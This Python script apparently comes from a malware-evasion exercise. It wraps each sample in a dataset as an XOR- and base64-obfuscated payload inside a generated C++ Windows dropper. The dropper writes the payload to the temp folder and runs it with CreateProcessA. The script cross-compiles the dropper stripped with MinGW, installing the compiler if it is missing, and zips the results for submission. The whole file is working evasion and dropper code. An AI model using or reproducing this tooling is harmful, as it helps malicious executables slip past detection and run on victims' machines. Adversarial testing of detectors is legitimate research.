#!/usr/bin/env python3
"""
Method 1 - Dropper pipeline extracted from attack2.py.

This standalone script is responsible for:
1. Importing the encrypted dataset archive.
2. Decompressing the sample set into a working directory.
3. Running the cross-compiled dropper transformation (including the CSV/SHA logging).
4. Compressing the resulting directory back into a zip for submission or sharing.
"""

import argparse
import base64
import csv
import hashlib
import random
import shutil
import subprocess
import tempfile
import time
import zipfile
from pathlib import Path


METHOD_NAME = "method1_dropper"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def placeholder_transform(src: Path, dst: Path) -> None:
    """
    Cross-platform dropper compiled with MinGW.
    Observed ~50% success with ~1.2MB outputs.
    """
    data = src.read_bytes()
    filename = src.name
    print(f"    -> Building dropper for {filename} ({len(data):,} bytes)")

    # 1. XOR + Base64
    key = random.randint(1, 255)
    encrypted = bytes(b ^ key for b in data)
    b64 = base64.b64encode(encrypted).decode()
    chunks = [b64[i : i + 10000] for i in range(0, len(b64), 10000)]
    b64_array = '"\n        "'.join(chunks)

    # 2. Compact dropper C++ implementation
    code = f'''#include <windows.h>
#include <string>
static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
unsigned char* d(const char* i, size_t* l) {{
    size_t n = strlen(i), p = 0, b = 0, bits = 0;
    if (i[n-1]=='=') p++; if (n>1 && i[n-2]=='=') p++;
    size_t ol = (n*3)/4 - p;
    unsigned char* o = (unsigned char*)malloc(ol);
    size_t j = 0;
    for(size_t x=0; x<n; x++) {{
        char c = i[x]; if(c=='=') break;
        const char* f = strchr(b64, c); if(!f) continue;
        b = (b << 6) | (f - b64); bits += 6;
        if(bits >= 8) {{ bits -= 8; o[j++] = (b >> bits) & 0xFF; }}
    }}
    *l = j; return o;
}}
int main() {{
    const char* p =
        "{b64_array}";
    size_t len; unsigned char* bin = d(p, &len);
    for(size_t i=0; i<len; i++) bin[i] ^= {key};
    char path[MAX_PATH]; GetTempPathA(MAX_PATH, path);
    strcat(path, "\\\\{filename}");
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(h != INVALID_HANDLE_VALUE) {{
        DWORD w; WriteFile(h, bin, len, &w, NULL); CloseHandle(h);
        STARTUPINFOA si = {{sizeof(si)}}; PROCESS_INFORMATION pi;
        CreateProcessA(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }}
    free(bin); return 0;
}}'''

    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp_path = Path(tmp_dir)
        src_cpp = tmp_path / "d.cpp"
        out_exe = tmp_path / "d.exe"
        src_cpp.write_text(code)

        compiler = "x86_64-w64-mingw32-g++"
        cmd = [
            compiler,
            str(src_cpp),
            "-o",
            str(out_exe),
            "-static",
            "-O3",
            "-s",
            "-fno-exceptions",
            "-fno-rtti",
            "-Wl,--strip-all",
            "-Wl,--no-insert-timestamp",
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
            if result.returncode == 0 and out_exe.exists():
                final_exe = dst.with_suffix(".exe")
                shutil.copy2(out_exe, final_exe)
                size = final_exe.stat().st_size
                print(f"    Dropper compile succeeded -> {final_exe.name} ({size:,} bytes)")
                return
            error_msg = result.stderr.splitlines()[0] if result.stderr else "unknown error"
            print(f"    MinGW compile failed: {error_msg}")
        except FileNotFoundError:
            print(f"    Compiler {compiler} not found; attempting automatic install...")

    # Attempt best-effort MinGW install (only works on apt-based systems)
    if shutil.which("apt-get"):
        print("    Installing MinGW-w64 cross-compiler (one-time setup)...")
        subprocess.run(["apt-get", "update", "-qq"], check=False)
        subprocess.run(
            [
                "apt-get",
                "install",
                "-y",
                "-qq",
                "gcc-mingw-w64-x86-64",
                "g++-mingw-w64-x86-64",
            ],
            check=False,
        )
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
            if result.returncode == 0 and out_exe.exists():
                final_exe = dst.with_suffix(".exe")
                shutil.copy2(out_exe, final_exe)
                print(f"    Auto install succeeded; dropper generated -> {final_exe.name}")
                return
        except Exception as exc:  # pragma: no cover - best effort logging
            print(f"    Auto rebuild failed: {exc}")

    print("    All attempts failed -> writing original bytes")
    dst.write_bytes(data)


def process_files(input_dir: Path, output_dir: Path) -> None:
    if output_dir.exists():
        shutil.rmtree(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    files = collect_inputs(input_dir)
    rows = []
    success = 0
    fail = 0

    print(f"Found {len(files)} files")
    for idx, src in enumerate(files, 1):
        print(f"[{idx}/{len(files)}] {src.name}")
        dst = output_dir / src.name
        base_sha = sha256_of(src)
        start = time.time()

        try:
            placeholder_transform(src, dst)
            duration = time.time() - start
            out_sha = sha256_of(dst)
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": out_sha,
                    "status": "OK",
                    "duration_sec": f"{duration:.3f}",
                    "notes": "dropper",
                }
            )
            success += 1
        except Exception as exc:  # pragma: no cover - transformation failure logging
            rows.append(
                {
                    "filename": src.name,
                    "baseline_sha256": base_sha,
                    "output_sha256": "",
                    "status": "FAIL",
                    "duration_sec": "0.000",
                    "notes": f"error: {str(exc)[:120]}",
                }
            )
            fail += 1

    report_file = output_dir / "compare_report.csv"
    with report_file.open("w", newline="") as handle:
        writer = csv.DictWriter(
            handle,
            fieldnames=[
                "filename",
                "baseline_sha256",
                "output_sha256",
                "status",
                "duration_sec",
                "notes",
            ],
        )
        writer.writeheader()
        writer.writerows(rows)

    sha_file = output_dir / "sha256sums.txt"
    with sha_file.open("w") as handle:
        for row in rows:
            if row["status"] == "OK":
                handle.write(f'{row["output_sha256"]}  {output_dir / row["filename"]}\n')

    print("\nSummary")
    print("-------")
    print(f"Success: {success} | Fail: {fail} | Total: {len(files)}")
    print(f"Outputs:\n - {report_file}\n - {sha_file}")


def run_pipeline(archive_path: Path, work_root: Path, output_zip: Path) -> None:
    input_dir = work_root / "input"
    output_dir = work_root / "output"
    extract_dataset(archive_path, input_dir)
    process_files(input_dir, output_dir)
    compress_outputs(output_dir, output_zip)
    print(f"\nPackaging complete -> {output_zip}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Run the Model1 Method1 dropper pipeline end-to-end."
    )
    parser.add_argument(
        "--archive",
        default=str(DEFAULT_ARCHIVE),
        help="Path to the zipped dataset (default: attacker/to_be_evaded_ds.zip).",
    )
    parser.add_argument(
        "--work-root",
        default=str(DEFAULT_WORK_ROOT),
        help="Working directory used for extraction and processing.",
    )
    parser.add_argument(
        "--output-zip",
        default=str(DEFAULT_OUTPUT_ZIP),
        help="Destination zip that stores the transformed samples.",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    run_pipeline(
        Path(args.archive).expanduser().resolve(),
        Path(args.work_root).expanduser().resolve(),
        Path(args.output_zip).expanduser().resolve(),
    )


if __name__ == "__main__":
    main()
